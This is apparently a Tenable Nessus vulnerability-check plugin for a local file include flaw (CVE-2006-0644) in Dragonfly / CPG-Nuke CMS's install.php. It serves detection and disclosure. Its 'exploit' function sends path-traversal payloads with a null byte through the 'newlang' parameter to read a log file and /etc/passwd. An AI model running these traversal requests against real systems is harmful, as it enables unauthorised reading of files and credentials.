#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
local file include issue. 

Description :

The remote host appears to be running Dragonfly / CPG-Nuke CMS, a
content management system written in PHP. 

The installed version of Dragonfly / CPG-Nuke CMS fails to validate
user input to the 'getlang' parameter as well as the 'installlang'
cookie before using them in the 'install.php' script in PHP
'require()' functions.  An unauthenticated attacker can leverage this
issue to view arbitrary files on the remote host and possibly to
execute arbitrary PHP code taken from files on the remote host, both
subject to the privileges of the web server user id.  

Note that successful exploitation is not affected by PHP's
'register_globals' and 'magic_quotes_gpc' settings. 

See also :

http://retrogod.altervista.org/dragonfly9.0.6.1_incl_xpl.html
http://www.securityfocus.com/archive/1/424439/30/0/threaded
http://dragonflycms.org/Forums/viewtopic/p=98034.html

Solution :

Remove the affected 'install.php' script.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(20869);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0644");
  script_bugtraq_id(16546);

  script_name(english:"Dragonfly CMS currentlang Parameter Local File Include Vulnerability");
  script_summary(english:"Checks for currentlang parameter local file include vulnerability in Dragonfly CMS");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# A function to actually read a file.
function exploit(dir, file) {
  local_var req, res;
  global_var port;

  req = http_get(
    item:string(
      dir, "/install.php?",
      "newlang=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  return res;
}


# Loop through directories.
if (thorough_tests) dirs = make_list("/public_html", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = exploit(dir:dir, file:"../../cpg_error.log%00");
  if (res == NULL) exit(0);

  # There's a problem if it looks like Dragonfly's log file.
  if ("# CHMOD this file to" >< res) {
    # Try to exploit it to read /etc/passwd for the report.
    res2 = exploit(dir:dir, file:"../../../../../../../../../../etc/passwd%00");
    if (res2) contents = res2 - strstr(res2, "<!DOCTYPE html PUBLIC");

    if (isnull(contents)) report = desc;
    else {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here is the /etc/passwd file that Nessus read from the remote host :\n",
        "\n",
        contents
      );
    }

    security_warning(port:port, data:report);
    exit(0);
  }
}
